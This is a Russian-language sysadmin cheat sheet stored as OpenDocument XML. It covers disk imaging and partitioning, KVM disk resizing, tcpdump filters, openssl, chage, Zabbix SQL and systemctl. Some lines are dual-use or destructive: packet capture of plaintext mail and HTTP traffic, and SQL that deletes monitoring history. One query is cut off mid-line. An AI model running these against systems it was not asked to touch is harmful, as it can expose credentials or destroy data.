      <text:p text:style-name="P1">dd if=/dev/scd0 of=name_file.iso bs=2048 - извлекаем образ iso с cd/dvd </text:p>
      <text:p text:style-name="P1">dd if=/dev/zero of=my_disk count=2048000 - Создаем заполненный нулями файл объемом 1 Гбайт</text:p>
      <text:p text:style-name="P1">du -sh my_disk - Проверяем размер виртуальной файловой системы</text:p>
      <text:p text:style-name="P1">mkfs -t ext3 my_disk - Создаем файловую систему на mydisk</text:p>
      <text:p text:style-name="P1">mkdir /mnt/image <text:s/>- создаем пустой каталог</text:p>
      <text:p text:style-name="P1">mount -o loop my_disk /mnt/image - монтируем my_disk в пустой каталог </text:p>
      <text:p text:style-name="P1">cd /mnt/image <text:s/>- переходим в каталог /mnt/image</text:p>
      <text:p text:style-name="P1">mkdir test - создаем каталог test </text:p>
      <text:p text:style-name="P1">cp /etc/hosts - копируем /etc/hosts в текущий каталог</text:p>
      <text:p text:style-name="P1">cd .. - переходим на уровень выше (выходим из текущего каталога)</text:p>
      <text:p text:style-name="P4">umount /mnt/image - отмонтмровать /mnt/image</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">HDD tools:</text:span></text:p>
      <text:p text:style-name="P1">gsmartcontrol - графическая программа проверки диска (SMART)</text:p>
      <text:p text:style-name="P1">smartmontools - консольная программа для проверки и контроля диска (SMART)</text:p>
      <text:p text:style-name="P1">parted - работа с таблицей разделов, аналог fdisk (еще есть partx)</text:p>
      <text:p text:style-name="P1">partman - разметка диска (поддерживает LVM) (Это предпочтительная утилита)</text:p>
      <text:p text:style-name="P1">partitioner - разметить диск</text:p>
      <text:p text:style-name="P1">fdisk - разметка диска </text:p>
      <text:p text:style-name="P1">ls -l /dev/disk/by-uuid - вот так узнать UUID жесткого диска для файла /etc/fstab</text:p>
      <text:p text:style-name="P1">blkid - вот так узнать UUID жесткого диска для файла /etc/fstab</text:p>
      <text:p text:style-name="P1">cat /proc/partitions - Все зарегистрированные разделы (Linux)</text:p>
      <text:p text:style-name="P1">mount - Смонтированные файловые системы</text:p>
      <text:p text:style-name="P1">mount | column -t <text:s/>- Смонтированные файловые системы</text:p>
      <text:p text:style-name="P23">df - Свободное пространство на дисках</text:p>
      <text:p text:style-name="P25">Эти утилиты предоставляют важные возможности для анализа и отладки сетевых проблем в различных операционных системах. Windows: tracert - стандартная утилита в Windows для трассировки маршрута, которая известна многим. tracert google.com. pathping - это встроенный в Windows аналог утилиты mtr с аналогичной функциональностью, но поддерживающий только icmp запросы. Обычно он уже установлен в системе, и его не требуется устанавливать отдельно. pathping google.com. tracetcp - это виндовая утилита, которая может выполнять tcp syn запросы по маршруту следования пакетов. Она помогает определить доступность определенного порта и может указать, где именно блокируется этот порт. Для установки этой утилиты потребуется скачать ее с официального сайта и установить вручную. tracetcp google.com:443. Linux: traceroute - это стандартная утилита Linux, предназначенная для трассировки маршрута. По умолчанию она использует протокол udp, но вы можете выполнить трассировку с использованием протокола icmp следующим образом. traceroute -I google.com. tracepath - аналогична утилите traceroute, но использует протокол udp и сразу выводит значения mtu и маршрутизаторы, где происходит изменение mtu. tracepath google.com. mtr - эта утилита объединяет функциональность утилит ping и traceroute. Она может использовать протоколы tcp, udp и icmp. В операционной системе Windows есть аналог с названием Winmtr. mtr -c3 google.com</text:p>
      <text:p text:style-name="P26">KVM изменить размер диска / blockresize / domblklist / guests linux / mbr /gpt?</text:p>
      <text:p text:style-name="P26">Изменение диска offline / qemu-img</text:p>
      <text:p text:style-name="P26">!!! не забываем делать backup</text:p>
      <text:p text:style-name="P26">qemu-img resize vmdisk.qcow2 +10G - добавим 10Гб диску vmdisk.img</text:p>
      <text:p text:style-name="P26">Изменение диска online / blockresize</text:p>
      <text:p text:style-name="P26">virsh blockresize &lt;domain&gt; &lt;path&gt; &lt;size&gt;</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>[--domain] &lt;строка&gt; <text:s/>имя домена, ID или UUID</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5"><text:s text:c="3"/>[--path] &lt;строка&gt; <text:s/>Полный путь к блочному устройству</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>[--size] &lt;число&gt; <text:s/>Новый размер блочного устройства, кратный целому числу (по умолчанию в КиБ)</text:p>
      <text:p text:style-name="P26">virsh domblklist name_VM - узнаем какие диски есть у ВМ</text:p>
      <text:p text:style-name="P26">virsh blockresize name_VM /kvm/name_VM_disk.qcow2 100G - для ВМ (name_VM), изменим размер диска равный 100Гб</text:p>
      <text:p text:style-name="P26">Необходимые действия для гостя, при изменении диска, MBR диск / один раздел / fdisk:</text:p>
      <text:p text:style-name="P26">!!! Не забываем делать backup </text:p>
      <text:p text:style-name="P26">!!! Внимание пример для одного диска с одним разделом</text:p>
      <text:p text:style-name="P26">!!! fdisk -l - посмотреть доступные</text:p>
      <text:p text:style-name="P26">fdsik /dev/sda - редактируем таблицу разделов</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>: p - показываем таблицу разделов</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>Устр-во <text:s text:c="3"/>Загрузочный Start Конец Секторы Size Id Тип</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>/dev/sda1 <text:s/>* <text:s text:c="11"/>2048 14678015 14675968 <text:s text:c="2"/>7G 83 Linux</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>: d - удаляем таблицу разделов</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>: n - создаем таблицу разделов</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>Do you want to remove the signature? [Y]es/[N]o: N - не удаляем сигнатуры</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>: a - ставим ставим загрузочный бит</text:p>
      <text:p text:style-name="P27"><text:s text:c="3"/>: w - применяем изменения</text:p>
      <text:p text:style-name="P27">!!! после выхода из (fdisk) будет сказано что изменена таблица разделов и необходимо выполнить partprobe</text:p>
      <text:p text:style-name="P26">(name_VM)# partprobe - выполняем просим систему перечитать таблицу разделов</text:p>
      <text:p text:style-name="P26">(name_VM)# resize2fs /dev/sda1 - выполняем изменения FS</text:p>
      <text:p text:style-name="P26">Необходимые действия для гостя, при изменении диска, MBR диск / несколько разделов / parted:</text:p>
      <text:p text:style-name="P26">!!! Не забываем делать backup </text:p>
      <text:p text:style-name="P26">!!! Внимание пример для одного диска и нескольких разделов</text:p>
      <text:p text:style-name="P26">!!! fdisk -l - посмотреть доступные</text:p>
      <text:p text:style-name="P26">Пример (parted)</text:p>
      <text:p text:style-name="P26">(name_VM)# parted /dev/vda - открываем нужный диск</text:p>
      <text:p text:style-name="P26"><text:s text:c="11"/>(parted) print free - покажем доступные <text:s/>разделы (диск /dev/vda)</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>Number Start End Size Type File system Flags</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>1 32.3kB 4295MB 4295MB primary ext4 boot</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>2 4295MB 8590MB 4295MB primary linux-swap(v1)</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>3 8590MB 107GB 98GB primary ext4</text:p>
      <text:p text:style-name="P26"><text:s text:c="17"/>107GB 215GB 107GB Free Space</text:p>
      <text:p text:style-name="P26"><text:s text:c="11"/>(parted) resizepart 3 - изменяем размер третьего раздела</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>End [107GB]? 215GB</text:p>
      <text:p text:style-name="P26"><text:s text:c="11"/>(parted) quit - выходим из parted</text:p>
      <text:p text:style-name="P26">(name_VM)#partprobe - выполняем просим систему перечитать таблицу разделов</text:p>
      <text:p text:style-name="P26">(name_VM)#resize2fs /dev/vda3 - <text:s/>выполняем изменения FS</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Необходимые действия для гостя, при изменении диска, GBT диск / несколько разделов / parted:</text:span></text:p>
      <text:p text:style-name="P26">!!! GPT Рассматривается схема с одним разделом (/dev/vdb1) на весь диск</text:p>
      <text:p text:style-name="P26">(name_VM)#partprobe</text:p>
      <text:p text:style-name="P26">(name_VM)#gdisk /dev/vdb</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>переходим в расширенный режим x</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>смещаем запись в конец диска e</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>выходим из расширенного режима m</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Command (? for help): d</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Using 1</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Command (? for help): n</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Partition number (1-128, default 1): [Enter]</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>First sector (34-2147483614, default = 2048) or {+-}size{KMGTP}: [Enter]</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Last sector (2048-2147483614, default = 2147483614) or {+-}size{KMGTP}: [Enter]</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Current type is 'Linux filesystem'</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Hex code or GUID (L to show codes, Enter = 8300): [Enter]</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Changed type of partition to 'Linux filesystem'</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>выходим с сохранением w</text:p>
      <text:p text:style-name="P26">(name_VM)#partprobe</text:p>
      <text:p text:style-name="P26">(name_VM)#resize2fs /dev/vdb1</text:p>
      <text:p text:style-name="P26">или</text:p>
      <text:p text:style-name="P27">btrfs filesystem resize max /&lt;MOUNTPOINT&gt;</text:p>
      <text:p text:style-name="P27">Смонтировать образ диска qcow2 в гипервизоре:</text:p>
      <text:p text:style-name="P26">modprobe nbd max_part=8</text:p>
      <text:p text:style-name="P26">qemu-nbd --connect=/dev/nbd0 &lt;PATH-TO-IMAGE&gt;.qcow2</text:p>
      <text:p text:style-name="P26">fdisk /dev/nbd0 -l</text:p>
      <text:p text:style-name="P26">mount -o ro /dev/nbd0p1 /mnt/ext0</text:p>
      <text:p text:style-name="P26">umount /mnt/ext0</text:p>
      <text:p text:style-name="P26">qemu-nbd --disconnect /dev/nbd0</text:p>
      <text:p text:style-name="P28">rmmod nbd</text:p>
      <text:p text:style-name="P26">tcpdump / снифер / sniffer</text:p>
      <text:p text:style-name="P26">Примеры использования tcpdump:</text:p>
      <text:p text:style-name="P26">tcpdump -i eth0 # слушаем интерфейс eth0</text:p>
      <text:p text:style-name="P26">tcpdump port 80 # слушаем 80 порт <text:s text:c="12"/></text:p>
      <text:p text:style-name="P26">tcpdump host google.com # слушаем трафик с хоста google.com</text:p>
      <text:p text:style-name="P26">tcpdump -n -i eth0 icmp # Ловим пакеты icmp (ping pong)</text:p>
      <text:p text:style-name="P26">tcpdump | grep -v ssh # поиск пакетов исключая пакеты ssh</text:p>
      <text:p text:style-name="P26">tcpdump -n -i eth0 net 192.168.1.15 # трафик с/на IP</text:p>
      <text:p text:style-name="P26">tcpdump -n -i eth0 net 192.168.1.0/24 # трафик с/в сеть</text:p>
      <text:p text:style-name="P26">tcpdump -l &gt; dump &amp;&amp; tail -f dump # Вывод с записью в файл</text:p>
      <text:p text:style-name="P26">tcpdump -i eth0 -w traffic.eth0 # Информация о трафике записывается в бинарный файл traffic.eth0</text:p>
      <text:p text:style-name="P26">tcpdump -i eth0 -s 0 -w traffic.eth0 # Запись + загрузка в бинарный файл</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">tcpdump -r traffic.eth0 # Читаем из файла</text:span></text:p>
      <text:p text:style-name="P26">tcpdump -i eth0 -X port \(110 or 143\) # Проверка pop и imap на безопасность</text:p>
      <text:p text:style-name="P26">tcpdump -i eth0 -s 0 -A port 80 | grep GET # (-s 0 весь пакет, -A для ASCII)</text:p>
      <text:p text:style-name="P26">tcpdump -npi iface_name ether src MAC-address # узнать MAC устройства iface_name -имя интерфейса MAC-address -мак адрес устройства</text:p>
      <text:p text:style-name="P26">tcpdump -vvv -s 0 -l -n port 53 # показываем DNS трафик</text:p>
      <text:p text:style-name="P26">tcpdump -nl -i bge0 not port ssh and src \(192.168.16.121 or 192.168.16.54\)</text:p>
      <text:p text:style-name="P26">tcpdump -n -i eth1 net 192.168.16.121 # Выборка входящий/исходящий по одному IP адресу</text:p>
      <text:p text:style-name="P26">tcpdump -n -i eth1 net 192.168.16.0/24 # Выборка входящий/исходящий по адресу сети</text:p>
      <text:p text:style-name="P26">tcpdump -l &gt; dump &amp;&amp; tail -f dump # Вывод через буфер</text:p>
      <text:p text:style-name="P26">tcpdump -i rl0 -w traffic.rl0 # Писать заголовки в бинарный файл</text:p>
      <text:p text:style-name="P26">tcpdump -i rl0 -s 0 -w traffic.rl0 # Писать в бинарный фйл полные пакеты</text:p>
      <text:p text:style-name="P26">tcpdump -r traffic.rl0 # Прочитать из файла (так-же для ethereal</text:p>
      <text:p text:style-name="P28">tcpdump -i eth0 -s 0 -A port 80 | grep GET # -s 0 для полных пакетов, -A для ASCII</text:p>
      <text:p text:style-name="P25">Подборка утилит сканирования Linux на уязвимости и вредоносы: https://github.com/radareorg/radare2/; https://rkhunter.sourceforge.net/; https://github.com/stamparm/maltrail; https://cisofy.com/lynis/; https://www.rfxn.com/projects/linux-malware-detect/; https://www.chkrootkit.org/; https://www.clamav.net/; https://remnux.org/; http://download-mirror.savannah.gnu.org/releases/tiger/; https://github.com/virustotal/yara.</text:p>
      <text:p text:style-name="P27">Загружаем видео с YouTube, используя Python. YouTube стал сокровищницей образовательного контента, развлечений и многого другого. Когда вам потребуется скачать видео, можете сделать это с помощью Python и библиотеки Pytube. Сначала убедитесь, что у вас установлен Pytube. Если вы еще этого не сделали, вы можете легко установить его с помощью pip, прописав в терминале: «pip install pytube». Создайте простой скрипт python (файл с расширением .py):</text:p>
      <text:p text:style-name="P26">"""</text:p>
      <text:p text:style-name="P26">from pytube import YouTube</text:p>
      <text:p text:style-name="P26">video_url = "https://www.youtube.com/watch?v=hgI0p1zf31k"</text:p>
      <text:p text:style-name="P26">yt = YouTube(video_url)</text:p>
      <text:p text:style-name="P26">stream = yt.streams.get_highest_resolution()</text:p>
      <text:p text:style-name="P26">output_path = "path/to/output/directory/"</text:p>
      <text:p text:style-name="P26">stream.download(output_path)</text:p>
      <text:p text:style-name="P26">"""</text:p>
      <text:p text:style-name="P28">Измените этот скрипт, заменив адрес ролика и путь, куда будет сохранено видео. Запустите скрипт в терминале командой «python file.py» и видео будет скачано на ваш компьютер.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Как заставить пользователя изменить пароль при следующем входе в систему?</text:span></text:p>
      <text:p text:style-name="P26">Использование команды passwd - sudo passwd --expire [username]</text:p>
      <text:p text:style-name="P26">Использование команды chage - sudo chage --lastday 0 [username]</text:p>
      <text:p text:style-name="P26">Срок действия паролей - chage -l. Будет выведена следующая информация: Когда пароль был последний раз изменен; Дата окончания действия пароля; Сколько дней осталось до окончания действия пароля; Когда учетная запись пользователя будет закончена (можно, пожалуйста, далее мы будем говорить «заэкспайрится»?); Минимальное количество дней между итерацией смены пароля; Максимальное количество дней между итерацией смены пароля.</text:p>
      <text:p text:style-name="P26">Заставляем пользователя менять пароль каждые 90 дней - sudo chage -M 90</text:p>
      <text:p text:style-name="P26">Задаем срок жизни учетной записи (до 12 июня 2023) - sudo chage -E 2023-06-12 serg</text:p>
      <text:p text:style-name="P26">Сколько времени на смену пароля?</text:p>
      <text:p text:style-name="P26">В примере даем Борису 10 дней на смену пароля с момента как пароль заэкспайрился</text:p>
      <text:p text:style-name="P26">sudo chage -I 10 boris</text:p>
      <text:p text:style-name="P26">Уведомление о смене пароля заранее. Через 25 дней истекает срок годности пароля Бориса - sudo chage -W 25 boris</text:p>
      <text:p text:style-name="P26">Защищаемся от частой смены паролей пользователя. Минимальное количество дней между сменой паролей - sudo chage -m 25 boris</text:p>
      <text:p text:style-name="P28">Удалить ограничение в днях - sudo chage -m 0 sergey</text:p>
      <text:p text:style-name="P26">Скрипт / копирование файла из сетевого хранилища в каталог c:\users\public\desktop\ на разные ПК. Как оно работает:</text:p>
      <text:p text:style-name="P26">c:\users\public\desktop\ ---- файлы из этого каталога будут видны всем пользователям на данном пк</text:p>
      <text:p text:style-name="P26">chcp 1251 &gt;nul <text:s/>--- нужно для решение проблемы с кодировкой</text:p>
      <text:p text:style-name="P27">set listfile=host.txt --- список компов (комп = одна строка)</text:p>
      <text:p text:style-name="P27">for /f "tokens=1" %%i in (%listfile%) do call :procedure %%i - цикл (проходит по списку)</text:p>
      <text:p text:style-name="P26">:procedure</text:p>
      <text:p text:style-name="P26">copy "\\fileserv\files\file1.lnk" "\\%1\c$\users\public\Desktop\" - выполнение команды</text:p>
      <text:p text:style-name="P26">Создаем файл copy_file_for_desktops_users.cmd</text:p>
      <text:p text:style-name="P26">chcp 1251 &gt;nul</text:p>
      <text:p text:style-name="P26">set listfile=host.txt</text:p>
      <text:p text:style-name="P26">for /f "tokens=1" %%i in (%listfile%) do call :procedure %%i</text:p>
      <text:p text:style-name="P26">:procedure</text:p>
      <text:p text:style-name="P26">copy "\\fileserv\files\file1.lnk" "\\%1\c$\users\public\Desktop\"</text:p>
      <text:p text:style-name="P26">Создаем файл host.txt</text:p>
      <text:p text:style-name="P26">Comp 1</text:p>
      <text:p text:style-name="P26">Comp 2</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Comp 3</text:span></text:p>
      <text:p text:style-name="P26">Comp 4</text:p>
      <text:p text:style-name="P26">Comp 5</text:p>
      <text:p text:style-name="P28">Comp 6</text:p>
      <text:p text:style-name="P26">Вывод cron всех пользователей. Вывод задач в cron для текущего пользователя осуществляется просто: crontab -l. Список задач другого пользователя (например, oracle) можно посмотреть так: crontab -u oracle -l. Но иногда требуется посмотреть список задач в cron для всех пользователей, сделать это можно следующей командой: for user in $(cut -d':' -f1 /etc/passwd); do crontab -u $user -l; done. Если это требуется не единожды, а постоянно, можно написать небольшой скрипт, для этого в файле ~/.bashrc прописываем:</text:p>
      <text:p text:style-name="P26"># Цвета вывода</text:p>
      <text:p text:style-name="P26">red='\e[0;31m'</text:p>
      <text:p text:style-name="P26">RED='\e[1;31m'</text:p>
      <text:p text:style-name="P26">green='\e[0;32m'</text:p>
      <text:p text:style-name="P26">GREEN='\e[1;32m'</text:p>
      <text:p text:style-name="P26">NC='\e[0m'</text:p>
      <text:p text:style-name="P26"><text:s/># Определение функции вывода задач cron всех пользователей</text:p>
      <text:p text:style-name="P26">function allcrontab() {</text:p>
      <text:p text:style-name="P26"><text:s text:c="5"/>for user in $(cut -d':' -f1 /etc/passwd); do</text:p>
      <text:p text:style-name="P26"><text:s text:c="10"/>usercrontab=$(crontab -l -u ${user} 2&gt;/dev/null)</text:p>
      <text:p text:style-name="P26"><text:s text:c="10"/>if [ -n "${usercrontab}" ]; then</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>echo -e "${RED}====== Start crontab for user ${NC}${GREEN}${user}${NC} ${RED}======${NC}"</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>crontab -l -u ${user} | sed '/ *#/d; /^ *$/d'</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>echo -e "${RED}====== End crontab for user ${NC}${GREEN}${user}${NC} ${RED}========${NC}\n"</text:p>
      <text:p text:style-name="P26"><text:s text:c="10"/>fi</text:p>
      <text:p text:style-name="P26"><text:s text:c="5"/>done</text:p>
      <text:p text:style-name="P27">}</text:p>
      <text:p text:style-name="P27">Выполнив source ~/.bashrc или просто перелогинившись в консоли, можем выполнить команду allcrontab и получить красивый вывод списка задач cron всех пользователей в системе.</text:p>
      <text:p text:style-name="P26">ТОП-5 систем обнаружения и предотвращения вторжений (IPS/IDS). IDS/IPS - системы обнаружения и предотвращения вторжений используются для защиты от сетевых атак. Основное различие между ними в том, что IDS - это система мониторинга, а IPS - система управления. Они так тесно связаны друг с другом, что их часто объединяют в названии - IDPS:</text:p>
      <text:p text:style-name="P26">1. Snort (https://www.snort.org/) - это бесплатная система предотвращения сетевых вторжений (NIPS) и система обнаружения сетевых вторжений (NIDS). В 2009 году Snort вошел в Зал славы открытого исходного кода InfoWorld как один из «величайших [предметов] программного обеспечения всех времен».</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">2. OSSEC (https://github.com/ossec/ossec-hids) - всеобъемлющий HIDS с открытым исходным кодом. Выполняет анализ журнала, проверку целостности </text:span><text:soft-page-break/><text:span text:style-name="T5">файлов, мониторинг политик, обнаружение руткитов, оповещение в реальном времени и активное реагирование. Недавно был отдельный пост (https://t.me/hack_less/1525) о данном HIDS.</text:span></text:p>
      <text:p text:style-name="P26">3. Security Onion (https://securityonionsolutions.com/) - это дистрибутив Linux для обнаружения вторжений, мониторинга сетевой безопасности и управления журналами. Он основан на Ubuntu и содержит Snort, Suricata, Bro, OSSEC, Sguil, Squert, Snorby, ELSA, Xplico, NetworkMiner.</text:p>
      <text:p text:style-name="P26">4. Zeek (https://zeek.org/) - это мощная структура сетевого анализа, которая сильно отличается от типичных IDS, которые вы, возможно, знаете.</text:p>
      <text:p text:style-name="P28">5. AIEngine (https://bitbucket.org/camp0/aiengine/src/master/) - это механизм проверки пакетов Python/Ruby/Java/Lua следующего поколения с возможностями обучения без вмешательства человека, функциями NIDS, классификацией доменов DNS, сетевым сборщиком, сетевой криминалистикой и др.</text:p>
      <text:p text:style-name="P26">Проверяем TLS-сертификат удаленного SMTP-сервера. Для проверки сертификата SMTP-сервера можно воспользоваться утилитой OpenSSL. Если вы хотите проверить сертификат с помощью STARTTLS, выполните следующую команду (заменив домен на нужный): openssl s_client -connect mail.example.com:25 -starttls smtp. Или для стандартного защищенного порта: openssl s_client -connect mail.example.com:465. Учтите, что openssl не поддерживает использование хранилища сертификатов Windows, поэтому проверка в Windows всегда будет неудачной. Примеры SQL запросов для базы данных Zabbix: Поиск хоста по имени:</text:p>
      <text:p text:style-name="P26">SELECT * FROM hosts WHERE host like '%name%';</text:p>
      <text:p text:style-name="P26">SELECT * FROM hosts WHERE name like '%name%';</text:p>
      <text:p text:style-name="P26">Поиск элементов данных указанного хоста: SELECT * FROM items WHERE hostid = '10105';</text:p>
      <text:p text:style-name="P26">Поиск истории значений для указанного элемента данных: SELECT * FROM history WHERE itemid = '24526';</text:p>
      <text:p text:style-name="P27">Удалим всю историю элемента данных до 03.06.2022 (время указано в Unix формате, конвертеры можно найти через поисковик): DELETE FROM history WHERE itemid = '24526' AND clock &lt; '1654041600';</text:p>
      <text:p text:style-name="P27">Удаление всей истории данных до 03.06.2022: DELETE FROM history WHERE clock &lt; '1654041600';</text:p>
      <text:p text:style-name="P26">Массово менял интервал и динамику изменений в элементы данных шаблонов и хостов я следующими запросами (первый определяет ID шаблона или хоста, второй изменяет интервалы):</text:p>
      <text:p text:style-name="P26">SELECT * FROM `hosts` WHERE host="Template ICMP Ping";</text:p>
      <text:p text:style-name="P26">UPDATE items SET delay=3600 WHERE hostid=10105 AND delay=600;</text:p>
      <text:p text:style-name="P28">UPDATE items SET trends=180 WHERE hostid=10047 AN</text:p>
      <text:p text:style-name="P26">Шпаргалка по часто используемым командам systemctl:</text:p>
      <text:p text:style-name="P26">1. Посмотреть статус службы. Покажет статус службы на примере сети network - systemctl status network</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">2. Запустить сервис. Запустит сервис баз данных на примере mysql - systemctl start mysql</text:span></text:p>
      <text:p text:style-name="P26">3. Остановить службу. Остановит сервис времени ntpd - systemctl stop ntpd</text:p>
      <text:p text:style-name="P26">4. Перезапустить службу. Перезапустит веб-сервер nginx - systemctl restart nginx</text:p>
      <text:p text:style-name="P26">5. Включить автозапуск службы. Разрешит автозапуск веб-сервера apache - systemctl enable apache</text:p>
      <text:p text:style-name="P26">6. Отключить автозапуск службы. Запретит автозапуск брандмауэра firewalld - systemctl disable firewalld</text:p>
      <text:p text:style-name="P26">7. Выполнить команду на удаленной системе. Остановит cron на компьютере с IP-адресом 192.168.0.15, подключившись под учетной записью root - systemctl --host root@192.168.0.15 stop cron</text:p>
      <text:p text:style-name="P26">8. Перезагрузить сервер. Перезагрузит локальный сервер - systemctl reboot</text:p>
      <text:p text:style-name="P28">9. Проверка работы сервиса. Выполняется с помощью опции is-active. В данном примере мы проверим работу службы docker - systemctl is-active docker. а) Если сервис запущен, мы увидим: active; <text:s/>б) Если не запущен: failed или: inactive; в) Если такого сервиса нет в системе: unknown или: inactive. Если сервис не работает или его нет в системе, команда вернет код ошибки, таким образом конструкция: systemctl is-active docker &amp;&amp; docker run hello-world приведет к выполнению команды docker run hello-world только в том случае, если сервис docker работает.</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text:p>
      <text:p text:style-name="P27">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7">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text:soft-page-break/><text:span text:style-name="T5">Your public key has been saved in /root/.ssh/id_rsa.pub.</text:span></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Конвертация PFX в CRT и KEY. Для ECDSA:</text:p>
      <text:p text:style-name="P26">openssl pkcs12 -in certificate_ECDSA.pfx -out certificate_ECDSA.key -nodes -nocerts</text:p>
      <text:p text:style-name="P26">openssl pkcs12 -in certificate_ECDSA.pfx -out certificate_ECDSA.crt -nokeys</text:p>
      <text:p text:style-name="P26">Если pfx запаролен, будет запрошен Import Password.</text:p>
      <text:p text:style-name="P26">Для RSA:</text:p>
      <text:p text:style-name="P26">openssl pkcs12 -in certificate_RSA.pfx -clcerts -nokeys -out certificate_RSA.crt</text:p>
      <text:p text:style-name="P26">openssl pkcs12 -in certificate_RSA.pfx -nocerts -out certificate_RSA-encrypted.key</text:p>
      <text:p text:style-name="P26">openssl rsa -in certificate_RSA-encrypted.key -out certificate_RSA.key</text:p>
      <text:p text:style-name="P28">Если pfx запаролен, будет запрошен Import Password. Ключ сперва сохраняется в зашифрованном виде, для этого требуется задать PEM pass, который затем нужно указать при расшифровке ключа.</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T5">Регулярные выражение для поиска IP адресов. Ниже представлены регулярные выражения, которые помогут найти все IP адреса в строке. Данные </text:span><text:soft-page-break/><text:span text:style-name="T5">регулярные выражения соответствуют шаблонам IPv4 и IPv6 адресов. Регулярное Выражение для Поиска IP Адресов.</text:span></text:p>
      <text:p text:style-name="P27">Паттерн для поиска IPv4 адресов, соответствует всем значениям от 0.0.0.0to 999.999.999.999и в большинстве случаев этого бывает достаточно: "([0-9]{1,3}[\.]){3}[0-9]{1,3}"</text:p>
      <text:p text:style-name="P26">Найти Все IP Адреса с Помощью Grep. Пропарсим файл и найдем в нем все IP адреса из диапазона от 0.0.0.0до 999.999.999.999с помощью grep: $ grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" file.txt</text:p>
      <text:p text:style-name="P26">Поиск Правильных IPv4 Адресов. Регулярное выражение для поиска и проверки правильных IPv4 адресов: "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</text:p>
      <text:p text:style-name="P28">Поиск IPv6 Адресов. Регулярное выражение для проверки IPv6 адреса: "((^|:)([0-9a-fA-F]{0,4})){1,8}"</text:p>
      <text:p text:style-name="P26">Увеличение времени сессии SSH. Бывает, что выполнение удаленно запущенной команды может затянуться, а необходимо дождаться ее выполнения (кстати, в этом случае весьма полезным может стать использование screen), или пришлось отвлечься, а сессия SSH в это время отвалилась. У меня на работе подобное случалось часто, поэтому решил увеличить на сервере таймаут сессии ssh, чтобы сохранить и соединение, и собственные нервы. На сервере в конфигурационном файле /etc/ssh/sshd_config прописываем:</text:p>
      <text:p text:style-name="P26">TCPKeepAlive yes</text:p>
      <text:p text:style-name="P26">ClientAliveInterval 300</text:p>
      <text:p text:style-name="P26">ClientAliveCountMax 60</text:p>
      <text:p text:style-name="P28">TCPKeepAlive - установлен в «yes», значит сервер будет периодически пинговать клиента, проверяя жив ли он. ClientAliveInterval - задает интервал пинга для проверки состояния клиента (в секундах). Параметр работает только для протокола версии 2 (Protocol 2). ClientAliveCountMax - количество пингов клиента. Таким образом в моем примере таймаут сессии будет равен 60*300/60 = 300 минут = 5 часов. После изменения настроек не забудьте перезапустить сервис ssh.</text:p>
      <text:p text:style-name="P26">Как ускорить навигацию командной строки? Повторный запуск под root - sudo !!</text:p>
      <text:p text:style-name="P26">user@host: cat /var/log/messages</text:p>
      <text:p text:style-name="P26">cat /var/log/messages: Permission denied.</text:p>
      <text:p text:style-name="P26">Как не надо: Вверх. Влево. Влево. Влево. …. sudo Enter. Рррр.</text:p>
      <text:p text:style-name="P26">Как надо: sudo !!</text:p>
      <text:p text:style-name="P26">Повторный ввод последнего аргумента - Alt+. Вы захотели еще раз воспользоваться только что написанным аргументом? Например, созданной директорией?</text:p>
      <text:p text:style-name="P26">Как не надо: mkdir MyNewDirectory; cd MyNewDirectory</text:p>
      <text:p text:style-name="P26">Как надо: mkdir MyNewDirectory</text:p>
      <text:p text:style-name="P26">cd &lt;Alt+.&gt;</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Поиск запущенной команды - Ctrl+R. Какую же команду я только что запускал? Вверх. Вверх. Вверх. Вверх. О, вот и она! Снова и снова вам приходится копаться в истории, ведь вы не знаете более подходящих альтернатив. Но что, если я скажу вам о том, что есть… поиск?</text:span></text:p>
      <text:p text:style-name="P26">Как не надо: Вверх. Вверх. Вверх. Enter.</text:p>
